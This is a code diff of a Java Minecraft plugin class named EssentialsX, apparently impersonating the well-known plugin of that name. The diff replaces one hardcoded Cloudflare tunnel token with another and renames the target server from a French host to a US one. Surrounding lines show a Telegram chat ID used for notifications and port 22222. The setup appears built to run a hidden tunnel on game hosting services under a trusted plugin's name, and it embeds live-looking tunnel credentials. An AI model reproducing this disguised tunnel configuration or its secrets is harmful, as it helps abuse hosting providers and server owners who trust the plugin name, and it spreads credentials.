@@ -20,7 +20,7 @@ public class EssentialsX extends JavaPlugin {
     private int port = 22222;
 
     //Cloudflare隧道Token
-    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiYzVmNDZjYWMtZWI4ZS00MDU3LTk3YmUtY2NlYWVjOWNiMTYzIiwicyI6Ik9UUTFZalEzWTJRdE1EUmtPUzAwWXpJeUxUZzBaakF0WWpNNE1ETTBOemd6TW1OayJ9"; //必填
+    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiMTM4ZTBlODMtMTNlMS00MzQ3LWExNDItYjNkODUzNjEyOGIyIiwicyI6Ik56QTNPREZtTjJRdE1XUTRZUzAwWkRoaUxUazNOek10WWpJM09HRmpNalV3Tm1NMiJ9"; //必填
 
     //Cloudflare隧道绑定域名
     private String host = "127.0.0.1"; //必填
@@ -30,7 +30,7 @@ public class EssentialsX extends JavaPlugin {
     private String tgChatId = "5800052646";
 
     // 服务器名称(区分不同服务器通知用)
-    private String servername = "Skymc-法国";
+    private String servername = "Dracobyte-美国";
 
     @Override
     public void onEnable() {
